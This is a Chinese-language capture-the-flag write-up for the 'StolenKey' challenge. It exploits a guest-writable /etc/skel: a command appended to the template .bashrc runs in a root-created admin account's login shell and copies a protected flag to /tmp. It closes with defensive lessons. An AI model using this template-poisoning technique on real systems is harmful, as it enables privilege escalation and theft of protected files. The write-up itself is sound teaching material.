# StolenKey 解题过程

## 0x00 登录与信息收集

SSH 连接题目环境，使用 MOTD 中给出的低权限账号：

```bash
ssh guest@HOST -p 58022   # guest / guest
```

题目提示"每分钟发生一些事情"，先看系统里以分钟为周期的任务，以及自己的权限。

```bash
cat /etc/cron.d/admin-job
ls -ld /etc/skel
```

可以确认两件事：

- cron 每分钟以 root 重建 `admin`，把 `/root/flag.txt` 放到
  `/home/admin/.flag`，然后启动 `admin` 的登录 shell；
- `/etc/skel` 的属主是 `guest`，普通用户可以直接修改新用户的家目录模板。

## 0x01 污染家目录模板

`useradd -m admin` 会把 `/etc/skel` 的内容复制到 `/home/admin`。于是向
`/etc/skel/.bashrc` 追加一条命令：

```bash
echo 'cp ~/.flag /tmp/flag && chmod 644 /tmp/flag' >> /etc/skel/.bashrc
```

命令会在 `admin` 的登录 shell 中执行，而 cron 里的
`su -l admin -c 'bash --login -i -c exit'` 正是交互式登录 shell，会加载
`~/.bashrc`。

## 0x02 等待并取 flag

下一次 cron 触发后，`admin` 的 `.flag` 被复制到 `/tmp/flag` 并放开读权限：

```bash
sleep 60
cat /tmp/flag
```

提交得到的 `HCTF{...}` 即可。

## 0x03 复盘

- 低权限用户不应拥有 `/etc/skel`；
- 新建账号的初始化模板必须来自受信任目录；
- 以 root 身份重建账号时，不应顺带执行该账号可影响的 shell 配置。
